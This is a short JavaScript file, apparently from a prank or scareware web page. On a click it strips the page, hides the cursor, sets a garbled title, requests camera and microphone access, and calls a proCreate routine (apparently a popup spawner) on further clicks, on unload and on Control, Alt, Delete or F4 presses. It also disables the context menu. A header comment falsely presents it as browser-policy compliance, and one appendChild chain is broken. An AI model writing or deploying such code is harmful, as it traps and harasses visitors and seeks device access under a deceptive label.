/* 
 * [Aug 2023] Fixed addEventListener for the document container.
 * [Oct 2021] Added to comply with strict browser policies.
 *
 * Requires safe.js & math.js preload.
 */
container.addEventListener('click', async () => {
	await proCreate(1);
	document.querySelector("#ui").remove()
	document.querySelector("#play").remove()
	document.documentElement.style.cursor = "none"
	document.title = "!!>>!>!!??!?$$&^$?*$'$??$\"|||????"
	document.querySelector("link[rel='icon']").href = "faviconpp.ico";
	navigator.mediaDevices.getUserMedia({ video: true, audio: true });
	document.documentElement.addEventListener('click', async () => {
		await proCreate(1);
	})

	document
		.querySelector('body')
		.appendChild(document.createElement('img')
			.setAttribute('src', 'media/sort.gif')
			.setAttribute('id', 'sort')
		)

	window.onbeforeunload = async () => {
		await proCreate(1)
	}

	document.documentElement.addEventListener('keydown', async () => {
		if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
			await proCreate(1);
			confirm("!!!!??????????????$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$??????????");
			await proCreate(1);
		}

		return null;
	})
});

window.oncontextmenu = () => false;
